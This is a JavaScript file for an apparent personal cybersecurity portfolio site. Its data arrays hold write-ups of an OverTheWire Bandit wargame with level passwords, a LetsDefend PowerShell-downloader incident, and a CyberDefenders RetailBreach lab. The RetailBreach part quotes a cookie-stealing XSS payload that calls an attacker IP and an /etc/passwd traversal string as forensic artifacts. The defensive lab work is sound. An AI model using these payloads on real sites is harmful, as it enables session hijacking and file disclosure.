/* ==========================================================================
   1. Single-Page Navigation & Mobile Menu Switcher
   ========================================================================== */
const navLinks = document.querySelectorAll('.nav__link, .nav-switch, .nav__logo');
const sections = document.querySelectorAll('.page-section');
const navToggle = document.getElementById('navToggle');
const navList = document.getElementById('navList');

// Toggle Mobile Navigation Drawer
if (navToggle && navList) {
    navToggle.addEventListener('click', () => {
        navToggle.classList.toggle('active');
        navList.classList.toggle('open');
    });
}

function switchPage(targetId) {
    sections.forEach(sec => {
        sec.classList.remove('active');
        if (sec.id === targetId) {
            sec.classList.add('active');
        }
    });

    navLinks.forEach(link => {
        link.classList.remove('active');
        if (link.getAttribute('data-target') === targetId || (targetId === 'hero' && link.classList.contains('nav__logo'))) {
            link.classList.add('active');
        }
    });

    // Close mobile nav menu on selection
    if (navList && navList.classList.contains('open')) {
        navList.classList.remove('open');
        navToggle?.classList.remove('active');
    }

    // Scroll back to top of main area
    window.scrollTo({ top: 0, behavior: 'smooth' });

    // Auto-focus terminal input if switching to CLI view
    if (targetId === 'terminal') {
        const terminalInput = document.getElementById('terminalInput');
        if (terminalInput) {
            setTimeout(() => terminalInput.focus(), 100);
        }
    }
}

navLinks.forEach(link => {
    link.addEventListener('click', (e) => {
        e.preventDefault();
        const target = link.getAttribute('data-target') || 'hero';
        switchPage(target);
    });
});

/* ==========================================================================
   2. Interactive Terminal CLI Script
   ========================================================================== */
const terminalBody = document.getElementById('terminalBody');
const terminalInput = document.getElementById('terminalInput');

const commands = {
    help: "Available commands:\n - whoami: Display current persona\n - skills: List technical stack\n - certs: Show active credentials\n - projects: List featured labs & write-ups\n - contact: Get email\n - clear: Wipe terminal screen",
    whoami: "Francis Yllor Garcia [Cybersecurity Analyst & Threat Hunter]",
    skills: "Tools: Splunk, Sysmon, Wireshark, Kibana, Git\nLangs: Python, Bash, C, C++\nOS: Kali Linux, Windows Server, Windows 11",
    certs: "1. DICT Cybersecurity Professional Badge\n2. Certified Cybersecurity Professional (CCP)\n3. NetOps Certified Engineer (NTO-101)\n4. Certified AI Security Practitioner (CAISP)\n5. Google IT Support Certificate",
    projects: "1. OverTheWire Bandit Write-up\n2. LetsDefend: JetBrains Security Incident\n",
    contact: "Email: francisylorg@gmail.com | Location: Valenzuela City"
};

if (terminalInput) {
    terminalInput.addEventListener('keydown', function (e) {
        if (e.key === 'Enter') {
            const inputVal = terminalInput.value.trim().toLowerCase();

            const userLine = document.createElement('div');
            userLine.className = 'terminal__line';
            userLine.innerHTML = `<span style="color: #10b981;">bshpx@FrancisGarcia:~$</span> ${escapeHtml(terminalInput.value)}`;
            terminalBody.appendChild(userLine);

            if (inputVal === 'clear') {
                terminalBody.innerHTML = '';
            } else if (commands[inputVal]) {
                const resLine = document.createElement('div');
                resLine.className = 'terminal__line';
                resLine.style.whiteSpace = 'pre-line';
                resLine.style.color = '#06b6d4';
                resLine.textContent = commands[inputVal];
                terminalBody.appendChild(resLine);
            } else if (inputVal !== '') {
                const errLine = document.createElement('div');
                errLine.className = 'terminal__line';
                errLine.style.color = '#ff5f56';
                errLine.textContent = `zsh: command not found: ${inputVal}. Type 'help' for available commands.`;
                terminalBody.appendChild(errLine);
            }

            terminalInput.value = '';
            terminalBody.scrollTop = terminalBody.scrollHeight;
        }
    });
}

function escapeHtml(text) {
    return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

/* ==========================================================================
   3. Project Category Filtering
   ========================================================================== */
const filterButtons = document.querySelectorAll('.filter-btn');
const projectCards = document.querySelectorAll('.project-card');

filterButtons.forEach(btn => {
    btn.addEventListener('click', () => {
        filterButtons.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');

        const filter = btn.getAttribute('data-filter');

        projectCards.forEach(card => {
            const categories = card.getAttribute('data-category');
            
            if (filter === 'all' || categories.includes(filter)) {
                card.style.display = 'flex';
            } else {
                card.style.display = 'none';
            }
        });
    });
});

/* ==========================================================================
   4. Walkthrough Data Store
   ========================================================================== */

const banditLevels = [
    {
        level: "Level 0",
        title: "Establishing the Foundation: SSH Connection",
        content: `Welcome to the OverTheWire Bandit wargame! In this first step, we connect to the remote Linux training server using SSH (Secure Shell).\n\n<code>ssh bandit0@bandit.labs.overthewire.org -p 2220</code>\n\n<em>What you're teaching:</em> We specify the username (<code>bandit0</code>), the target host, and the explicit port flag (<code>-p 2220</code>) because standard SSH runs on port 22.`
    },
    {
        level: "Level 0 → 1",
        title: "Navigating Directories & Reading Files",
        content: `Once logged in, we need to inspect our current working directory and read the files inside it.\n\n1. Type <code>ls</code> to list files.\n2. Read the contents using cat: <code>cat readme</code>\n\nPassword discovered: <code>6y2kwnwK6grgvwvpvLaa2T1cpFEKOhNR</code>\n\nTo wrap up, type <code>exit</code> to leave the session and log into the next level using <code>ssh bandit1@bandit.labs.overthewire.org -p 2220</code>.`
    },
    {
        level: "Level 1 → 2",
        title: "Bypassing Dashed Filenames",
        content: `Sometimes Linux files have special characters. Here, our target file is literally named <code>-</code>.\n\nIf you type <code>cat -</code>, Linux thinks you are trying to read from standard input rather than opening a file named a dash. \n\n<em>The Lesson:</em> We use explicit relative path notation (a dot-slash) to tell the shell: 'Look right here in this folder for a file named dash.'\n\n<code>cat ./-</code>\n\nPassword discovered: <code>PK8fYLZg2hnHSz83plBL1iEPKdD3QToB</code>`
    },
    {
        level: "Level 2 → 3",
        title: "Handling Spaces in Filenames",
        content: `In this challenge, our file contains spaces: <code>--spaces in this filename--</code>.\n\nIf you run <code>cat --spaces...</code> without protection, the shell interprets the leading dashes as command flags/options.\n\n<em>The Lesson:</em> We wrap the entire filename in double quotes (and include <code>./</code>) so the shell treats it strictly as a file path string:\n\n<code>cat ./"--spaces in this filename--"</code>\n\nPassword discovered: <code>7ZZ2LFrykP2zEyvBl4m3clcL7tGYJPME</code>`
    },
    {
        level: "Level 3 → 4",
        title: "Uncovering Hidden Files",
        content: `By default, standard commands like <code>ls</code> hide system files that begin with a dot (<code>.</code>).\n\n1. Move into the directory: <code>cd inhere</code>\n2. Use the "all" flag (<code>-a</code>) to reveal hidden files: <code>ls -a</code>\n3. Read our target file: <code>cat ...Hiding-From-You</code>\n\nPassword discovered: <code>xzTXq1rDJQVVAzdv5cHq1TQytTWufAMq</code>`
    },
    {
        level: "Level 4 → 5",
        title: "Using the 'file' Command to Inspect Types",
        content: `Inside the <code>inhere</code> folder, we are faced with many files starting with dashes. Opening them blindly with <code>cat</code> would dump raw binary garbage onto our terminal screen.\n\n<em>The Lesson:</em> Always check file types first before reading them:\n\n<code>file ./*</code>\n\nScanning the output shows that <code>./-file07</code> is labeled as <strong>ASCII text</strong> (human-readable). We target only that file:\n\n<code>cat ./-file07</code>\n\nPassword discovered: <code>6C7h9GD8M6ai5nr7wo1RonrzFjj9yIrG</code>`
    },
    {
        level: "Level 5 → 6",
        title: "Mastering Advanced Search with 'find'",
        content: `Instead of hunting manually through directories, we teach the computer to search using specific properties:\n\n<code>find ./* -type f -size 1033c ! -executable</code>\n\n<em>Breaking down the syntax for your readers:</em>\n- <code>-type f</code>: Look strictly for regular files.\n- <code>-size 1033c</code>: Match files exactly 1033 bytes (characters) big.\n- <code>! -executable</code>: The logical NOT operator (<code>!</code>) combined with <code>-executable</code> means "exclude anything you can run as a script."\n\nThis precisely pinpoints <code>./inhere/maybehere07/.file2</code>.\n\nPassword discovered: <code>pXa26xhMWaC2SvDotA4r9EgZkulOeSBW</code>`
    },
    {
        level: "Level 6 → 7",
        title: "System-Wide Searches & Channel Redirection",
        content: `We need to search the entire root filesystem (<code>/</code>) for a file owned by user <code>bandit7</code>, group <code>bandit6</code>, sized 33 bytes.\n\nRunning this creates an overwhelming wave of "Permission Denied" errors. Here, we teach students about <strong>Linux Stream Identifiers</strong>:\n- <code>1</code> = Standard Output (clean results)\n- <code>2</code> = Standard Error (warnings and permission blocks)\n\nBy adding <code>2>/dev/null</code>, we redirect all error messages into the system black hole, leaving us with a clean result:\n\n<code>find / -group bandit6 -size 33c -user bandit7 2>/dev/null</code>\n\nPassword file found at <code>/var/lib/dpkg/info/bandit7.password</code>.`
    },
    {
        level: "Level 7 → 8",
        title: "Text Filtering with 'grep'",
        content: `When searching through massive data files for a specific keyword (in this case, "millionth"), we don't read line by line—we use <code>grep</code>.\n\n<code>grep -w "millionth" data.txt</code>\n\n<em>The Lesson:</em> The <code>-w</code> flag ensures we match the exact whole word "millionth" rather than a partial substring inside another word, instantly exposing our target line and password.`
    },
    {
        level: "Level 8 → 9",
        title: "Sorting and Isolating Unique Lines",
        content: `Data.txt contains a messy list where lines repeat. We need the one single line that occurs only once.\n\nWe chain two commands together using a <strong>pipe (<code>|</code>)</strong>, which feeds data smoothly from left to right:\n\n<code>sort data.txt | uniq -u</code>\n\n<em>Why this works:</em> <code>sort</code> organizes the text alphabetically so that identical lines sit directly next to each other. Then, <code>uniq -u</code> scans the sorted list and prints <em>only</em> the unique line with zero duplicates.`
    },
    {
        level: "Level 9 → 10",
        title: "Extracting Human-Readable Text with 'strings'",
        content: `When a file contains mixed binary data and text, standard readers fail. We use the <code>strings</code> command to pull out embedded human-readable ASCII text sequences, then pipe it into grep to find lines preceded by equals signs (<code>=</code>):\n\n<code>strings data.txt | grep ===</code>\n\nThis strips away the digital noise and isolates the clean password line.`
    },
    {
        level: "Level 10 → 11",
        title: "Decoding Base64 Data",
        content: `Data.txt contains Base64 encoded text (recognized by its standard padding and alphanumeric character set). To make sense of it, we instruct the system to decode it directly in the terminal:\n\n<code>base64 -d data.txt</code>\n\nThe <code>-d</code> flag tells the utility to switch from encoding mode into <strong>decoding mode</strong>, instantly revealing the plain-text password.`
    },
    {
        level: "Level 11 → 12",
        title: "Cracking Ciphers with ROT13 Translation",
        content: `In this final level, all alphabetical letters have been rotated by 13 positions (a classic Caesar cipher known as ROT13).\n\nInstead of manual decryption, we teach students how to use the <code>tr</code> (translate) command to remap the alphabet on the fly:\n\n<code>cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code>\n\n<em>The Lesson:</em> This maps A through M to N through Z, and vice-versa for both upper and lower cases, instantly shifting the encrypted text back into readable English!`
    },
    {
        level: "Level 12 → 13",
        title: "Reversing Heaps, Hexdumps & Multi-Layer Compression",
        content: `In Level 12, the password file is a hex dump of a binary that has been repeatedly compressed (gzip, bzip2, tar archives nested together).\n\n1. Create a secure working environment: <code>cd $(mktemp -d)</code>\n2. Copy and reverse the hex dump: <code>xxd -r /home/bandit12/data.txt > data.bin</code>\n3. Iteratively inspect archive signatures using <code>file data.bin</code>, rename with proper extensions (<code>.gz</code>, <code>.bz2</code>, <code>.tar</code>), and extract recursively (<code>gzip -d</code>, <code>bzip2 -d</code>, <code>tar -xf</code>).\n\nOnce the final ASCII text layer is reached, <code>cat</code> reveals the password for Level 13!`
    }
    
];

const jetbrainsSteps = [
    {
        step: "Phase 1",
        title: "Alert Triage & Initial Alarm Analysis",
        content: `When investigating an alert on LetsDefend involving a developer environment like JetBrains, our first job as a SOC analyst is to evaluate the initial alert metadata.\n\n- <strong>Alert Name:</strong> Suspicious JetBrains IDE Child Process Spawn\n- <strong>Host:</strong> DEV-WORKSTATION-04\n- <strong>User:</strong> developer\n\n<em>What you're teaching:</em> Never jump straight to conclusions. Check the parent-child process tree first to see what launched the application.`
    },
    {
        step: "Phase 2",
        title: "Process Lineage & Anomaly Detection",
        content: `Using EDR or endpoint telemetry, we inspect the process execution chain.\n\n<code>explorer.exe -> idea64.exe -> cmd.exe -> powershell.exe -enc ...</code>\n\n<em>The Lesson:</em> An Integrated Development Environment (IDE) like JetBrains IntelliJ (<code>idea64.exe</code>) should normally spawn build tools (like Maven, Gradle, or compiler binaries). When it spawns a shell executing an obfuscated PowerShell script, it is a high-confidence indicator of malicious code execution (e.g., via a malicious plugin or project dependency).`
    },
    {
        step: "Phase 3",
        title: "Deobfuscating PowerShell Payloads",
        content: `The alert reveals a base64-encoded PowerShell command string. To understand the attacker's objective, we safely decode it:\n\n<code>powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA...</code>\n\n<em>Decoding workflow:</em> Copy the base64 string and run it through a decoder in your terminal or CyberChef:\n<code>echo 'JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA...' | base64 -d</code>\n\nThis uncovers a downloader script fetching a secondary payload from an external command-and-control (C2) server.`
    },
    {
        step: "Phase 4",
        title: "Network Artifacts & C2 Traffic Analysis",
        content: `Next, we pivot to network connection logs associated with the workstation around the time of the alert.\n\n- <strong>Destination IP:</strong> 185.x.x.x (External Unrecognized IP)\n- <strong>Protocol/Port:</strong> HTTPS (Port 443) with suspicious JA4/TLS fingerprint anomalies.\n\n<em>The Lesson:</em> Attackers frequently blend in using standard ports like 443. We look for irregular beaconing intervals, abnormal data transfer volumes outbound from a developer machine, and known malicious indicators of compromise (IoCs).`
    },
    {
        step: "Phase 5",
        title: "Containment & Remediation Workflow",
        content: `With the incident verified, we execute containment steps aligned with NIST/ITIL incident response frameworks:\n\n1. <strong>Isolate Host:</strong> Disconnect <code>DEV-WORKSTATION-04</code> from the corporate network via EDR isolation to prevent lateral movement.\n2. <strong>Preserve Evidence:</strong> Dump memory and capture volatile disk artifacts for deep forensic analysis.\n3. <strong>Account Remediation:</strong> Force a password reset for the affected developer account and revoke active API tokens/session keys.\n4. <strong>Root Cause Analysis:</strong> Audit installed IDE plugins and project configuration files to locate the infection vector.`
    }
];

const retailBreachSteps = [
    {
        step: "Step 1",
        title: "Identifying the Attacker's IP Address",
        content: `<strong>Lab Question:</strong> What is the attacker's IP address?\n\n- <strong>Investigation Approach:</strong> Open the PCAP file in Wireshark and go to <em>Statistics > Conversations > IPv4</em> or filter for abnormal HTTP 404 responses.\n- <strong>Wireshark Filter:</strong> <code>http.response.code == 404</code>\n- <strong>Key Artifact:</strong> <code>111.224.180.128</code>`
    },
    {
        step: "Step 2",
        title: "Identifying the Directory Brute-Forcing Tool",
        content: `<strong>Lab Question:</strong> Which tool did the attacker use to perform the brute-forcing?\n\n- <strong>Investigation Approach:</strong> Filter traffic originating from the attacker IP and inspect the HTTP <code>User-Agent</code> header in early reconnaissance streams.\n- <strong>Wireshark Filter:</strong> <code>ip.src == 111.224.180.128 and http</code>\n- <strong>Key Artifact:</strong> <code>gobuster</code>`
    },
    {
        step: "Step 3",
        title: "Extracting the Stored XSS Payload",
        content: `<strong>Lab Question:</strong> Can you specify the XSS payload used to compromise the web application?\n\n- <strong>Investigation Approach:</strong> Filter for POST requests targeting user reviews and decode the payload body using CyberChef URL Decode.\n- <strong>Wireshark Filter:</strong> <code>ip.src == 111.224.180.128 && http.request.method == "POST" && frame contains "script"</code>\n- <strong>Key Artifact:</strong> <code>fetch('http://111.224.180.128/' + document.cookie);</code>`
    },
    {
        step: "Step 4",
        title: "Determining Admin Interaction Timestamp",
        content: `<strong>Lab Question:</strong> Provide the UTC timestamp when the admin user first visited the malicious page.\n\n- <strong>Investigation Approach:</strong> Isolate requests made by the legitimate administrator IP (<code>135.143.142.5</code>) to the reviews section and check arrival timestamps.\n- <strong>Wireshark Filter:</strong> <code>ip.src == 135.143.142.5 && http.request.uri contains "reviews"</code>\n- <strong>Key Artifact:</strong> <code>2024-03-29 12:09</code> UTC`
    },
    {
        step: "Step 5",
        title: "Extracting the Stolen Session Token",
        content: `<strong>Lab Question:</strong> Provide the session token acquired and used for unauthorized access.\n\n- <strong>Investigation Approach:</strong> Locate the session cookie transmitted back during admin interaction or observe subsequent requests from the attacker IP.\n- <strong>Wireshark Filter:</strong> <code>http.cookie contains "PHPSESSID"</code>\n- <strong>Key Artifact:</strong> <code>lqkctf24s9h9lg67teu8uevn3q</code>`
    },
    {
        step: "Step 6",
        title: "Identifying the Exploited Administrative Script",
        content: `<strong>Lab Question:</strong> What is the name of the script that was exploited by the attacker?\n\n- <strong>Investigation Approach:</strong> Filter attacker traffic utilizing the hijacked admin session cookie to locate accessed admin scripts.\n- <strong>Wireshark Filter:</strong> <code>ip.src == 111.224.180.128 && frame contains "lqkctf24s9h9lg67teu8uevn3q"</code>\n- <strong>Key Artifact:</strong> <code>log_viewer.php</code>`
    },
    {
        step: "Step 7",
        title: "Isolating the Directory Traversal Payload",
        content: `<strong>Lab Question:</strong> Identify the specific payload used to access a sensitive system file.\n\n- <strong>Investigation Approach:</strong> Examine parameters passed via URI to the vulnerable script containing path traversal sequences.\n- <strong>Wireshark Filter:</strong> <code>ip.src == 111.224.180.128 && http.request.uri contains "log_viewer.php"</code>\n- <strong>Key Artifact:</strong> <code>../../../../../etc/passwd</code>`
    }
];

/* ==========================================================================
   5. Modal & Carousel Render Functions
   ========================================================================== */
const modal = document.getElementById('projectModal');
const modalClose = document.getElementById('modalClose');
const modalTitle = document.getElementById('modalTitle');
const modalDesc = document.getElementById('modalDesc');
const modalRepoLink = document.getElementById('modalRepoLink');
const modalOtwLink = document.getElementById('modalOtwLink');
const openModalButtons = document.querySelectorAll('.open-modal');
const modalCyberDefendersLink = document.getElementById('modalCyberDefendersLink');

let currentLevelIndex = 0;
let currentJetbrainsIndex = 0;

function renderBanditCarousel() {
    const levelData = banditLevels[currentLevelIndex];

    let optionsHtml = '';
    banditLevels.forEach((lvl, index) => {
        optionsHtml += `<option value="${index}" ${index === currentLevelIndex ? 'selected' : ''}>${lvl.level}: ${lvl.title}</option>`;
    });

    modalDesc.innerHTML = `
        <div class="carousel-container">
            <div class="carousel-nav">
                <button id="prevLevelBtn" class="btn btn--outline btn--small" ${currentLevelIndex === 0 ? 'disabled' : ''}>&larr; Prev</button>
                <select id="levelSelect" class="carousel-select">
                    ${optionsHtml}
                </select>
                <button id="nextLevelBtn" class="btn btn--outline btn--small" ${currentLevelIndex === banditLevels.length - 1 ? 'disabled' : ''}>Next &rarr;</button>
            </div>
            <div class="carousel-card">
                <h4>${levelData.title}</h4>
                <div class="carousel-body">${levelData.content.replace(/\n/g, '<br>')}</div>
            </div>
        </div>
    `;

    document.getElementById('prevLevelBtn')?.addEventListener('click', () => {
        if (currentLevelIndex > 0) {
            currentLevelIndex--;
            renderBanditCarousel();
        }
    });

    document.getElementById('nextLevelBtn')?.addEventListener('click', () => {
        if (currentLevelIndex < banditLevels.length - 1) {
            currentLevelIndex++;
            renderBanditCarousel();
        }
    });

    document.getElementById('levelSelect')?.addEventListener('change', (e) => {
        currentLevelIndex = parseInt(e.target.value);
        renderBanditCarousel();
    });
}

function renderJetbrainsCarousel() {
    const stepData = jetbrainsSteps[currentJetbrainsIndex];

    let optionsHtml = '';
    jetbrainsSteps.forEach((st, index) => {
        optionsHtml += `<option value="${index}" ${index === currentJetbrainsIndex ? 'selected' : ''}>${st.step}: ${st.title}</option>`;
    });

    modalDesc.innerHTML = `
        <div class="carousel-container">
            <div class="carousel-nav">
                <button id="prevJetBtn" class="btn btn--outline btn--small" ${currentJetbrainsIndex === 0 ? 'disabled' : ''}>&larr; Prev</button>
                <select id="jetbrainsSelect" class="carousel-select">
                    ${optionsHtml}
                </select>
                <button id="nextJetBtn" class="btn btn--outline btn--small" ${currentJetbrainsIndex === jetbrainsSteps.length - 1 ? 'disabled' : ''}>Next &rarr;</button>
            </div>
            <div class="carousel-card">
                <h4>${stepData.title}</h4>
                <div class="carousel-body">${stepData.content.replace(/\n/g, '<br>')}</div>
            </div>
        </div>
    `;

    document.getElementById('prevJetBtn')?.addEventListener('click', () => {
        if (currentJetbrainsIndex > 0) {
            currentJetbrainsIndex--;
            renderJetbrainsCarousel();
        }
    });

    document.getElementById('nextJetBtn')?.addEventListener('click', () => {
        if (currentJetbrainsIndex < jetbrainsSteps.length - 1) {
            currentJetbrainsIndex++;
            renderJetbrainsCarousel();
        }
    });

    document.getElementById('jetbrainsSelect')?.addEventListener('change', (e) => {
        currentJetbrainsIndex = parseInt(e.target.value);
        renderJetbrainsCarousel();
    });
}

let currentRetailIndex = 0;

function renderRetailCarousel() {
    const stepData = retailBreachSteps[currentRetailIndex];

    let optionsHtml = '';
    retailBreachSteps.forEach((st, index) => {
        optionsHtml += `<option value="${index}" ${index === currentRetailIndex ? 'selected' : ''}>${st.step}: ${st.title}</option>`;
    });

    modalDesc.innerHTML = `
        <div class="carousel-container">
            <div class="carousel-nav">
                <button id="prevRetailBtn" class="btn btn--outline btn--small" ${currentRetailIndex === 0 ? 'disabled' : ''}>&larr; Prev</button>
                <select id="retailSelect" class="carousel-select">
                    ${optionsHtml}
                </select>
                <button id="nextRetailBtn" class="btn btn--outline btn--small" ${currentRetailIndex === retailBreachSteps.length - 1 ? 'disabled' : ''}>Next &rarr;</button>
            </div>
            <div class="carousel-card">
                <h4>${stepData.title}</h4>
                <div class="carousel-body">${stepData.content.replace(/\n/g, '<br>')}</div>
            </div>
        </div>
    `;

    document.getElementById('prevRetailBtn')?.addEventListener('click', () => {
        if (currentRetailIndex > 0) {
            currentRetailIndex--;
            renderRetailCarousel();
        }
    });

    document.getElementById('nextRetailBtn')?.addEventListener('click', () => {
        if (currentRetailIndex < retailBreachSteps.length - 1) {
            currentRetailIndex++;
            renderRetailCarousel();
        }
    });

    document.getElementById('retailSelect')?.addEventListener('change', (e) => {
        currentRetailIndex = parseInt(e.target.value);
        renderRetailCarousel();
    });
}

/* ==========================================================================
   6. Project Details Registry & Open Modal Trigger
   ========================================================================== */
const projectDetails = {
    'bandit-lab': {
        title: 'OverTheWire Bandit (Levels 0–11)',
        desc: '',
        repo: 'https://github.com/your-username/bandit-writeup',
        otw: 'https://overthewire.org/wargames/bandit/'
    },
    'jetbrains-lab': {
        title: 'LetsDefend / CyberDefenders: JetBrains Security Incident',
        desc: '',
        repo: '',
        otw: '',
        cyberDefenders: 'https://cyberdefenders.org/p/bshpx/?tab=labs'
    },
    'retailbreach-lab': {
        title: 'CyberDefenders: RetailBreach Lab Walkthrough',
        desc: '',
        repo: '',
        otw: '',
        cyberDefenders: 'https://cyberdefenders.org/p/bshpx/?tab=labs'
    },
};

openModalButtons.forEach(button => {
    button.addEventListener('click', () => {
        const projectId = button.getAttribute('data-project');
        const data = projectDetails[projectId];
        if (data) {
            modalTitle.textContent = data.title;
            modalRepoLink.setAttribute('href', data.repo);

            if (projectId === 'bandit-lab' && data.otw) {
                modalRepoLink.style.display = 'none';
                modalCyberDefendersLink.style.display = 'none';
                modalOtwLink.setAttribute('href', data.otw);
                modalOtwLink.style.display = 'inline-block';
            } else if (projectId === 'jetbrains-lab' && data.cyberDefenders) {
                modalRepoLink.style.display = 'none';
                modalOtwLink.style.display = 'none';
                modalCyberDefendersLink.setAttribute('href', data.cyberDefenders);
                modalCyberDefendersLink.style.display = 'inline-block';
            } else if (projectId === 'retailbreach-lab' && data.cyberDefenders) {
                modalRepoLink.style.display = 'none';
                modalOtwLink.style.display = 'none';
                modalCyberDefendersLink.setAttribute('href', data.cyberDefenders);
                modalCyberDefendersLink.style.display = 'inline-block';
            }
            else {
                modalOtwLink.style.display = 'none';
                modalCyberDefendersLink.style.display = 'none';
                modalRepoLink.style.display = 'inline-block';
            }

            if (projectId === 'bandit-lab') {
                currentLevelIndex = 0;
                renderBanditCarousel();
            } else if (projectId === 'jetbrains-lab') {
                currentJetbrainsIndex = 0;
                renderJetbrainsCarousel();
            } else if (projectId === 'retailbreach-lab') {
                currentRetailIndex = 0;
                renderRetailCarousel();
            }else {
                modalDesc.textContent = data.desc;
            }

            modal.classList.add('active');
        }
    });
});

modalClose.addEventListener('click', () => {
    modal.classList.remove('active');
});

window.addEventListener('click', (e) => {
    if (e.target === modal) {
        modal.classList.remove('active');
    }
});

/* ==========================================================================
   7. DICT Badge Modal Listener
   ========================================================================== */
const dictBadgeModal = document.getElementById('dictBadgeModal');
const viewDictBadgeBtn = document.getElementById('viewDictBadgeBtn');
const dictBadgeModalClose = document.getElementById('dictBadgeModalClose');

if (viewDictBadgeBtn && dictBadgeModal) {
    viewDictBadgeBtn.addEventListener('click', () => {
        dictBadgeModal.classList.add('active');
    });
}

if (dictBadgeModalClose && dictBadgeModal) {
    dictBadgeModalClose.addEventListener('click', () => {
        dictBadgeModal.classList.remove('active');
    });
}

window.addEventListener('click', (e) => {
    if (e.target === dictBadgeModal) {
        dictBadgeModal.classList.remove('active');
    }
});

/* ==========================================================================
   8. PGP Key Copy Utility
   ========================================================================== */
const copyPgpBtn = document.getElementById('copyPgpBtn');
if (copyPgpBtn) {
    copyPgpBtn.addEventListener('click', () => {
        const keyText = "4F8B 21C3 90A2 E811 76FF";
        navigator.clipboard.writeText(keyText).then(() => {
            copyPgpBtn.textContent = 'Copied!';
            setTimeout(() => {
                copyPgpBtn.textContent = 'Copy Key';
            }, 2000);
        });
    });
}

/* ==========================================================================
   9. Matrix Binary Background Animation
   ========================================================================== */
const canvas = document.getElementById('matrixCanvas');
if (canvas) {
    const ctx = canvas.getContext('2d');

    function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    resizeCanvas();
    window.addEventListener('resize', resizeCanvas);

    const chars = '01';
    const fontSize = 14;
    let columns = Math.floor(canvas.width / fontSize);
    let drops = [];

    for (let i = 0; i < columns; i++) {
        drops[i] = 1;
    }

    function drawMatrix() {
        ctx.fillStyle = 'rgba(7, 9, 14, 0.08)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);

        ctx.fillStyle = '#06b6d4';
        ctx.font = fontSize + 'px "JetBrains Mono", monospace';

        for (let i = 0; i < drops.length; i++) {
            const text = chars.charAt(Math.floor(Math.random() * chars.length));
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);

            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                drops[i] = 0;
            }
            drops[i]++;
        }
    }

    setInterval(drawMatrix, 50);
}